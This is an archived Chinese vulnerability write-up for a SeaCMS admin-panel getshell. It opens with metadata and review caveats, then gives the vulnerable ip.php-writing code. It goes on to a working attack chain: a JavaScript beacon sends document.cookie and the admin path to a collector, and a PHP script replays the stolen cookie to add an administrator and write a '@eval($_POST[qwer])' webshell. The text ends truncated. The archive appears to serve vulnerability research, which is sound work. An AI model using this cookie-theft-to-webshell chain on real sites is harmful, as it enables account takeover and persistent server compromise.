---
source: "hatch 补库批 20260928"
product: "SeaCMS version unspecified"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Seacms 后台getshell"
prerequisites: "来源所述条件，未列明部分仍待核：已获系统管理员Cookie/后台路径（JS注入入口需另链），CheckPurview通过，配置可写"
side_effects: "未执行；本文需注意的操作影响：脚本增加管理员且永久写data/admin/ip.php，并保存会话到文件，严重持久副作用；无状态验证"
source_status: "unknown"
id: "vw-c709af1b5c181f63781fb979"
entity_id: "ve-c709af1b5c181f63781fb979"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：已获系统管理员Cookie/后台路径（JS注入入口需另链），CheckPurview通过，配置可写

- **结论使用边界（1）**：不能仅标题后台getshell忽略脚本依赖先植XSS；与393互补但本篇无触发载荷。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：固定截去pathname21字符/固定目标IP、localhost收集器不通用。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **凭据与会话边界（3）**：脚本增加管理员且永久写data/admin/ip.php，并保存会话到文件，严重持久副作用；无状态验证。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **代码与转录边界（4）**：文尾只&lt;截断，缺版本/来源。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# seacms getshell

一、漏洞简介
------------

海洋cms是一款简单的php内容管理系统，主要用于视频网站，采用PHP+MYSQL架构，未使用框架

二、漏洞影响
------------

三、复现过程
------------

后台代码如下

    <?php

    header('Content-Type:text/html;charset=utf-8');

    require_once(dirname(__FILE__)."/config.php");

    CheckPurview();

    if($action=="set")

    {

        $v= $_POST['v'];

        $ip = $_POST['ip'];

        $open=fopen("../data/admin/ip.php","w" );

        $str='<?php ';

        $str.='$v = "';

        $str.="$v";

        $str.='"; ';

        $str.='$ip = "';

        $str.="$ip";

        $str.='"; ';

        $str.=" ?>";

        fwrite($open,$str);

        fclose($open);

        ShowMsg("成功保存设置!","admin_ip.php");

        exit;

    }

    ?>

这里根本没有经过过滤，直接将变量写进去，可以写一个脚本利用

代码如下

    # test.js

    var img = new Image();

    img.src=  "http://127.0.0.1/test.php?x=" + document.cookie + "&p=" + location.pathname;

    # test.php

    <?php

        function Requests($url, $data, $cookie = '', $type = 1){

            $ch = curl_init();

            $params[CURLOPT_URL] = $url;

               $params[CURLOPT_HEADER] = FALSE;

            $params[CURLOPT_SSL_VERIFYPEER] = false;

            $params[CURLOPT_SSL_VERIFYHOST] = false;

            $params[CURLOPT_RETURNTRANSFER] = true;

            if ($type === 1) {

                $params[CURLOPT_POST] = true;

                $params[CURLOPT_POSTFIELDS] = $data;

            }

            $params[CURLOPT_COOKIE] = $cookie;

            curl_setopt_array($ch, $params);

            $output = curl_exec($ch);

            file_put_contents('log.txt', $output, FILE_APPEND);

            curl_close($ch);

        }

        $C = $_GET['x'];

        $P = $_GET['p'];

        $P = substr($P, 0, strlen($P)-21);

        file_put_contents('c.txt', $C);

        file_put_contents('p.txt', $P);

        $url_1 = 'http://192.168.113.128'.$P.'admin_manager.php?action=add';

        $url_2 = 'http://192.168.113.128'.$P.'admin_ip.php?action=set';

        $data_1 = 'username=test&pwd=test&pwd2=test&groupid=1';

        $data_2 = 'v=0&ip=+";@eval($_POST[qwer]);"';

        Requests($url_1, $data_1, $C);

        Requests($url_2, $data_2, $C);

这两个脚本会将cookie和后台路径保存在文件中，并且会向后台发送数据，添加一个系统管理员，同时会在系统中写入一个一句话木马，需要注意的是修改域名为测试域名。测试如下

![](./.resource/Seacms后台getshell/media/rId24.png)

代码已经写进了后

![](./.resource/Seacms后台getshell/media/rId25.png)

管理员添加成功

![](./.resource/Seacms后台getshell/media/rId26.png)

\<
